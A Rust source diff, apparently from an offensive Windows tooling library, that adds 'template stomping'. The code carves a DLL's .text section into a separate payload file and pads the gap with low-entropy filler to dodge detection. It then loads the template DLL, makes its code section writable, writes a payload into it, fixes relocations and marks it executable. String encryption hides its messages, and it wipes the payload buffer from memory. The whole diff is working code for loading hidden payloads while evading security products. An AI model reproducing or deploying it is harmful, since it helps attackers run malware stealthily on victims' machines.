@@ -2,9 +2,9 @@
 extern crate litcrypt2;
 use_litcrypt!();
 
-use std::{env, fs, path::Path, ptr, ffi::c_void};
-use nanorand::{WyRand, Rng};
-use windows::Win32::Foundation::HANDLE;
+use std::{cell::UnsafeCell, env, ffi::c_void, fs, mem::size_of, path::Path, ptr::{self, copy_nonoverlapping}};
+use nanorand::{BufferedRng, Rng, WyRand};
+use windows::Win32::{Foundation::HANDLE, System::SystemServices::IMAGE_BASE_RELOCATION};
 use data::{PeMetadata, PVOID, PAGE_READWRITE, PeManualMap, PAGE_EXECUTE_READ};
 use winproc::Process;
 
@@ -169,8 +169,18 @@ pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<
     }
 
 
-    let file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
-    let result = overload_module(file_content, decoy_module_path)?;
+    let mut file_content = fs::read(payload_path).expect(&lc!("[x] Error opening the payload file."));
+    let result = overload_module(&file_content, decoy_module_path)?;
+    let file_content_ptr = file_content.as_mut_ptr();
+    
+    unsafe 
+    {
+        for i in 0..file_content.len()
+        {
+            *(file_content_ptr.add(i)) = 0u8;
+        }
+
+    }
 
     Ok(result)
 }
@@ -195,7 +205,7 @@ pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<
 ///     Err(e) => println!("An error has occurred: {}", e),      
 /// }
 /// ```
-pub fn overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(PeMetadata,isize), String> 
+pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Result<(PeMetadata,isize), String> 
 {   
     let mut decoy_module_path = decoy_module_path.to_string();
     if decoy_module_path != ""
@@ -248,7 +258,7 @@ pub fn overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Resul
 ///     Err(e) => println!("An error has occurred: {}", e),      
 /// }
 /// ```
-pub fn overload_to_section (file_content: Vec<u8>, section_metadata: PeManualMap) -> Result<(PeMetadata,isize), String>
+pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMap) -> Result<(PeMetadata,isize), String>
 {
     unsafe
     {
@@ -374,7 +384,7 @@ pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) 
 
         let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
 
-        let result: (PeMetadata,isize) = overload_to_section(file_content, decoy_metadata.0)?;
+        let result: (PeMetadata,isize) = overload_to_section(&file_content, decoy_metadata.0)?;
 
         Ok((decoy_content, result.1))
 }
@@ -539,3 +549,263 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: isi
     }
 }
 
+pub fn prepare_template(input_file: &str, output_directory: &str) -> Result<(), String>
+{
+    unsafe
+    {
+        let text_name = &lc!(".text");
+        if !Path::new(input_file).is_file() ||  !Path::new(output_directory).is_dir() {
+            return Err(lc!("[x] Invalid path."));
+        }
+
+        let mapped_dll = dinvoke::load_library_a(input_file);
+        if mapped_dll == 0 {
+            return Err(lc!("[x] Invalid input dll."));
+        }
+
+        let mapped_dll_metadata = manualmap::get_pe_metadata(mapped_dll as _).unwrap();
+        let entry_point;
+        if mapped_dll_metadata.is_32_bit 
+        {
+           entry_point = mapped_dll + mapped_dll_metadata.opt_header_32.AddressOfEntryPoint as isize;
+        }
+        else 
+        {
+           entry_point = mapped_dll + mapped_dll_metadata.opt_header_64.address_of_entry_point as isize;
+  
+        }
+
+        let mut tls_callback_vas: Vec<usize> = vec![]; 
+        if mapped_dll_metadata.opt_header_64.number_of_rva_and_sizes >= 10
+        {
+            let address: *mut u8 = (mapped_dll as usize + mapped_dll_metadata.opt_header_64.datas_directory[9].VirtualAddress as usize) as *mut u8;
+            let address_of_tls_callback = address.add(24) as *mut usize;
+            let mut address_of_tls_callback_array: *mut usize = std::mem::transmute(*address_of_tls_callback);
+            
+            while *address_of_tls_callback_array != 0
+            {
+                tls_callback_vas.push(*address_of_tls_callback_array);
+                address_of_tls_callback_array = address_of_tls_callback_array.add(1);
+            }
+        }
+          
+        // We calculate entrypoint/tls callbacks' RVAs from .text section's base address
+        let mut entrypoint_rva: u32 = 0;
+        let mut tls_callbacks_rvas: Vec<u32> = vec![];
+        for section in &mapped_dll_metadata.sections
+        {
+           if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
+           {
+              let text_base_address = mapped_dll as usize + section.VirtualAddress as usize;
+              entrypoint_rva = (entry_point as usize - text_base_address) as u32;
+  
+              for tls_callback_va in &tls_callback_vas
+              {
+                  let tls_rva = (tls_callback_va - text_base_address) as u32;
+                  tls_callbacks_rvas.push(tls_rva);
+              }
+
+              break;
+           }
+        }
+  
+        let dll_content = fs::read(input_file).expect(&lc!("[x] Error opening the specified dll."));
+        
+        let dll_content_buffer = dll_content.as_ptr() as _;
+        let pe_info = manualmap::get_pe_metadata(dll_content_buffer).unwrap();
+  
+        for section in &pe_info.sections
+        {
+            if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
+            {
+                let text_base_address: *mut c_void = (dll_content_buffer as usize + section.PointerToRawData as usize) as *mut c_void;
+                let size: usize = section.SizeOfRawData as usize;
+                let u = size / 4;
+                let mut text_content: Vec<u8> = vec![0;size];
+
+                // We do this to reduce the template's entropy
+                let mut first_buffer: Vec<u8> = vec![0;u*3];
+                let mut second_buffer: Vec<u8> = vec![0;u];
+                let mut rng = BufferedRng::new(WyRand::new());
+                rng.fill(&mut first_buffer);
+                first_buffer.append(&mut second_buffer);
+
+                copy_nonoverlapping(text_base_address as *mut u8, text_content.as_mut_ptr(), size);
+                
+                let payload_path = format!("{}{}",output_directory, lc!("payload.bin"));
+                let path: &Path = Path::new(&payload_path);
+                let _ = fs::write(path, &text_content);
+
+                let text_base_address: *mut c_void = (dll_content_buffer as usize + section.PointerToRawData as usize) as *mut c_void;
+                let size: usize = section.SizeOfRawData as usize;                
+                copy_nonoverlapping(first_buffer.as_ptr() as *const u8, text_base_address as *mut u8, size);
+
+                let dll_main_template = 214404767416760usize; // mov eax, 1; ret;
+                let entrypoint_addr = (dll_content_buffer as usize + section.PointerToRawData as usize + entrypoint_rva as usize) as *mut usize;
+                *entrypoint_addr = dll_main_template;
+
+                let callback_template = 0xc3 as u8; // ret
+                for tls_callbacks_rva in tls_callbacks_rvas
+                {
+                    let tls_callback_addr = (dll_content_buffer as usize + section.PointerToRawData as usize + tls_callbacks_rva as usize) as *mut u8;
+                    *tls_callback_addr = callback_template;
+                }
+
+                let template_path = format!("{}{}",output_directory, lc!("template.dll"));
+                let _ = fs::write(&template_path, &dll_content);
+                
+                break;
+            }
+        }
+
+        Ok(())
+    }
+}
+
+pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> Result<(PeMetadata,isize), String>
+{
+    unsafe
+    {
+        let text_name = &lc!(".text");
+        if !Path::new(template_path).is_file() {
+            return Err(lc!("[x] Invalid dll path."));
+        }
+
+        let loaded_dll = dinvoke::load_library_a(template_path);
+        if loaded_dll == 0{
+            return Err(lc!("[x] Error calling LoadLibraryA."));
+        }
+
+        let dll_metadata = manualmap::get_pe_metadata(loaded_dll as _).unwrap();
+        for section in &dll_metadata.sections
+        {
+            if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
+            {
+                let text_address: *mut c_void = (loaded_dll as usize + section.VirtualAddress as usize) as *mut c_void;
+                let text_sect_ending_addr = loaded_dll as usize + section.VirtualAddress as usize + section.Misc.VirtualSize as usize;
+                let text_addr_ptr: *mut PVOID = std::mem::transmute(&text_address);
+                let s: UnsafeCell<isize> = isize::default().into();
+                let size: *mut usize = std::mem::transmute(s.get());
+                *size = section.Misc.VirtualSize as usize;
+                let o = u32::default();
+                let old_protection: *mut u32 = std::mem::transmute(&o);
+                let new_protect: u32 = PAGE_READWRITE;
+
+                let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1), text_addr_ptr, size, new_protect, old_protection);
+
+                if ret != 0
+                {
+                    let _ = dinvoke::free_library(loaded_dll);
+                    return Err(lc!("[x] An error ocurred. Dll released."));
+                }
+
+                let handle = HANDLE(-1);
+                let written: usize = 0;
+                let nsize = payload_content.len();
+                let buffer: *mut c_void = payload_content.as_mut_ptr() as _;
+                let bytes_written: *mut usize = std::mem::transmute(&written);
+                let ret = dinvoke::nt_write_virtual_memory(handle, text_address, buffer, nsize, bytes_written);
+                if ret != 0
+                {
+                    let _ = dinvoke::free_library(loaded_dll);
+                    return Err(lc!("[x] An error ocurred. Dll released."));
+                }
+
+                relocate_text_section(&dll_metadata, loaded_dll as _, text_address as _,text_sect_ending_addr);
+
+                let text_address: *mut c_void = (loaded_dll as usize + section.VirtualAddress as usize) as *mut c_void;
+                let text_addr_ptr: *mut PVOID = std::mem::transmute(&text_address);
+                let s: UnsafeCell<isize> = isize::default().into();
+                let size: *mut usize = std::mem::transmute(s.get());
+                *size = section.Misc.VirtualSize as usize;
+                let o = u32::default();
+                let old_protection: *mut u32 = std::mem::transmute(&o);
+                let new_protect: u32 = PAGE_EXECUTE_READ;
+                let ret = dinvoke::nt_protect_virtual_memory(HANDLE(-1), text_addr_ptr, size, new_protect, old_protection);
+                if ret != 0
+                {
+                    let _ = dinvoke::free_library(loaded_dll);
+                    return Err(lc!("[x] An error ocurred. Dll released."));
+                }
+
+                return Ok((dll_metadata,loaded_dll));
+            }
+        }
+
+        Ok((PeMetadata::default(),0))
+
+    }
+}
+
+/// Performs all relocations on the .text section of a loaded module.
+///
+/// The parameters required are the module's metadata information and a
+/// pointer to the base address where the module is mapped in memory.
+fn relocate_text_section(pe_info: &PeMetadata, image_ptr: *mut c_void, start_address: usize, end_address: usize) 
+{
+    unsafe {
+
+        let module_memory_base: *mut usize = std::mem::transmute(image_ptr);
+        let image_data_directory;
+        let image_delta: isize;
+        if pe_info.is_32_bit 
+        {
+            image_data_directory = pe_info.opt_header_32.DataDirectory[5]; // BaseRelocationTable
+            image_delta = module_memory_base as isize - pe_info.opt_header_32.ImageBase as isize;
+        }
+        else 
+        {
+            image_data_directory = pe_info.opt_header_64.datas_directory[5]; // BaseRelocationTable
+            image_delta = module_memory_base as isize - pe_info.opt_header_64.image_base as isize;
+        }
+
+        let mut reloc_table_ptr = (module_memory_base as usize + image_data_directory.VirtualAddress as usize) as *mut i32;
+        let mut next_reloc_table_block = -1;
+
+        while next_reloc_table_block != 0 
+        {
+            let ibr: *mut IMAGE_BASE_RELOCATION = std::mem::transmute(reloc_table_ptr);
+            let image_base_relocation = *ibr;
+            let reloc_count: isize = (image_base_relocation.SizeOfBlock as isize - size_of::<IMAGE_BASE_RELOCATION>() as isize) / 2;
+
+            for i in 0..reloc_count
+            {
+                let reloc_entry_ptr = (reloc_table_ptr as usize + size_of::<IMAGE_BASE_RELOCATION>() as usize + (i * 2) as usize) as *mut u16;
+                let reloc_value = *reloc_entry_ptr;
+
+                let reloc_type = reloc_value >> 12;
+                let reloc_patch = reloc_value & 0xfff;
+
+                if reloc_type != 0
+                {
+                    
+                    if reloc_type == 0x3
+                    {
+                        let patch_ptr = (module_memory_base as usize + image_base_relocation.VirtualAddress as usize + reloc_patch as usize) as *mut i32;
+                        if reloc_patch as usize >= start_address && reloc_patch as usize <= (end_address - 4)
+                        {
+                            let original_ptr = *patch_ptr;
+                            let patch = original_ptr + image_delta as i32;
+                            *patch_ptr = patch;
+                        }
+                        
+                    }
+                    else 
+                    {
+                        let patch_ptr = (module_memory_base as usize + image_base_relocation.VirtualAddress as usize + reloc_patch as usize) as *mut isize;
+                        if reloc_patch as usize >= start_address && reloc_patch as usize <= (end_address - 8)
+                        {
+                            let original_ptr = *patch_ptr;
+                            let patch = original_ptr + image_delta as isize;
+                            *patch_ptr = patch;
+                        }
+                    }
+                }
+            }
+
+            reloc_table_ptr = (reloc_table_ptr as usize + image_base_relocation.SizeOfBlock as usize) as *mut i32;
+            next_reloc_table_block = *reloc_table_ptr;
+
+        }
+    }
+}
